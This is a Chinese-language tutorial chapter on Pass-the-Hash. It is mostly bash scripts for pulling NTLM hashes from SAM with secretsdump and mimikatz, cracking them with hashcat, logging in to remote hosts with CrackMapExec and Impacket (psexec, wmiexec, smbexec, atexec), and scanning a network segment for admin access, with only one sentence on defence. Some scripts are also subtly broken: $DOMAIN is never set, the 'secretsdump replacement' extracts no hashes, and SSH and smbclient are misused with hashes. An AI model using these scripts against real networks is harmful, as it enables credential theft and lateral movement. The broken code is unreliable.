# Pass-the-Hash的bash实现

## 章节概述

Pass-the-Hash（PTH）是一种利用 NTLM 哈希值进行身份验证的技术，无需知道明文密码即可访问远程系统。本章系统性地讲解 NTLM 哈希原理、hashcat 暴力破解、Pass-the-Hash 的 bash 实现以及 secretsdump 替代脚本。

> **核心理念**
> PTH 的本质是利用 Windows 认证协议中"哈希即凭据"的设计缺陷。攻击者获取哈希后可以直接用于认证，无需破解明文密码。防御端需要启用 NTLMv2、禁用 NTLM 认证、实施 LAPS。

---

### 第1节 NTLM 哈希原理

#### 1.1 NTLM 哈希格式

```bash
# NTLM 哈希格式: username:RID:LM Hash:NT Hash:::
# 示例:
# administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# LM Hash 通常为 aad3b435b51404eeaad3b435b51404ee (空密码)
# NT Hash 是真正的密码哈希

# 常见格式转换
# 1. SAM 数据库格式
# 2. shadow 格式
# 3. John the Ripper 格式
# 4. Hashcat 格式
```

#### 1.2 从 SAM 数据库提取哈希

```bash
#!/usr/bin/env bash
# extract_sam_hashes.sh - 从 SAM 数据库提取哈希
set -euo pipefail

echo "[*] 从 SAM 数据库提取 NTLM 哈希..."

# 使用 secretsdump.py (Impacket)
if command -v secretsdump.py &>/dev/null; then
    echo "[*] 使用 secretsdump.py..."
    secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL 2>/dev/null
fi

# 使用 mimikatz (如果在 Windows 环境)
echo ""
echo "===== Windows 环境哈希提取 ====="
echo "需要在 Windows 环境中运行 mimikatz:"
echo "  privilege::debug"
echo "  sekurlsa::logonpasswords"
echo "  lsadump::sam"
```

---

### 第2节 hashcat 暴力破解

#### 2.1 hashcat 基础使用

```bash
#!/usr/bin/env bash
# hashcat_crack.sh - 使用 hashcat 破解 NTLM 哈希
set -euo pipefail

HASH_FILE="${1:?用法: $0 <哈希文件> [字典文件]}"
DICT_FILE="${2:-/usr/share/wordlists/rockyou.txt}"

if ! command -v hashcat &>/dev/null; then
    echo "[-] hashcat 未安装"
    echo "[*] 安装: sudo apt install hashcat"
    exit 1
fi

echo "[*] 使用 hashcat 破解 NTLM 哈希..."
echo "    哈希文件: $HASH_FILE"
echo "    字典文件: $DICT_FILE"

# NTLM 模式 (mode 1000)
hashcat -m 1000 -a 0 "$HASH_FILE" "$DICT_FILE" --force 2>/dev/null

# 查看结果
hashcat -m 1000 "$HASH_FILE" --show 2>/dev/null
```

#### 2.2 hashcat 高级选项

```bash
# 暴力破解 (mode 3)
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a

# 组合攻击 (mode 1)
hashcat -m 1000 -a 1 hash.txt dict1.txt dict2.txt

# 掩码攻击
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?d?d

# 规则攻击
hashcat -m 1000 -a 0 hash.txt dict.txt -r rules/best64.rule

# 查看进度
hashcat -m 1000 hash.txt --status

# 恢复会话
hashcat -m 1000 hash.txt --restore
```

---

### 第3节 Pass-the-Hash 自动化

#### 3.1 使用 CrackMapExec

```bash
#!/usr/bin/env bash
# cme_pth.sh - 使用 CrackMapExec 进行 PTH
set -euo pipefail

TARGET="${1:?用法: $0 <目标IP/网段>}"
USERNAME="${2:?用法: $0 <目标> <用户名>}"
HASH="${3:?用法: $0 <目标> <用户名> <NTLM哈希>}"

if ! command -v crackmapexec &>/dev/null; then
    echo "[-] CrackMapExec 未安装"
    echo "[*] 安装: pip install crackmapexec"
    exit 1
fi

echo "[*] 使用 CrackMapExec 进行 Pass-the-Hash..."

# SMB PTH
crackmapexec smb "$TARGET" -u "$USERNAME" -H "$HASH" --shares 2>/dev/null

# WinRM PTH
crackmapexec winrm "$TARGET" -u "$USERNAME" -H "$HASH" 2>/dev/null

# SSH PTH (使用密码哈希)
crackmapexec ssh "$TARGET" -u "$USERNAME" -H "$HASH" 2>/dev/null
```

#### 3.2 使用 Impacket

```bash
#!/usr/bin/env bash
# impacket_pth.sh - 使用 Impacket 进行 PTH
set -euo pipefail

TARGET="${1:?用法: $0 <目标IP>}"
USERNAME="${2:?用法: $0 <目标IP> <用户名>}"
HASH="${3:?用法: $0 <目标IP> <用户名> <NTLM哈希>}"

echo "[*] 使用 Impacket 进行 Pass-the-Hash..."

# psexec
impacket-psexec "$DOMAIN/$USERNAME:$HASH@$TARGET" 2>/dev/null

# wmiexec
impacket-wmiexec "$DOMAIN/$USERNAME:$HASH@$TARGET" 2>/dev/null

# smbexec
impacket-smbexec "$DOMAIN/$USERNAME:$HASH@$TARGET" 2>/dev/null

# atexec
impacket-atexec "$DOMAIN/$USERNAME:$HASH@$TARGET" "whoami" 2>/dev/null
```

---

### 第4节 secretsdump 替代脚本

#### 4.1 bash 实现的哈希提取

```bash
#!/usr/bin/env bash
# bash_secretsdump.sh - bash 实现的哈希提取
set -euo pipefail

TARGET="${1:?用法: $0 <目标IP>}"
USERNAME="${2:?用法: $0 <目标IP> <用户名>}"
HASH="${3:?用法: $0 <目标IP> <用户名> <NTLM哈希>}"

echo "[*] bash 实现的 secretsdump..."

# 使用 smbclient 提取 SAM
if command -v smbclient &>/dev/null; then
    echo "[*] 使用 smbclient..."
    smbclient //$TARGET/IPC$ -U "$USERNAME%$HASH" -c "ls" 2>/dev/null
fi

# 使用 rpcclient 提取信息
if command -v rpcclient &>/dev/null; then
    echo "[*] 使用 rpcclient..."
    rpcclient -U "$USERNAME%$HASH" "$TARGET" -c "enumdomusers" 2>/dev/null
fi
```

#### 4.2 自动化 PTH 扫描器

```bash
#!/usr/bin/env bash
# pth_scanner.sh - Pass-the-Hash 自动化扫描
set -euo pipefail

TARGET="${1:?用法: $0 <目标网段>}"
HASH="${2:?用法: $0 <目标网段> <NTLM哈希>}"
USERLIST="${3:-/usr/share/seclists/Usernames/top-usernames-shortlist.txt}"

echo "[*] Pass-the-Hash 自动化扫描..."

while IFS= read -r user; do
    [[ -z "$user" ]] && continue
    user=$(echo "$user" | tr -d '\r')

    echo "[*] 尝试: $user"

    # 使用 crackmapexec 测试
    if command -v crackmapexec &>/dev/null; then
        result=$(crackmapexec smb "$TARGET" -u "$user" -H "$HASH" --pass-pol 2>/dev/null)
        if echo "$result" | grep -q "Pwn3d!"; then
            echo "[!] 成功! $user - 管理员权限"
        fi
    fi
done < "$USERLIST"
```

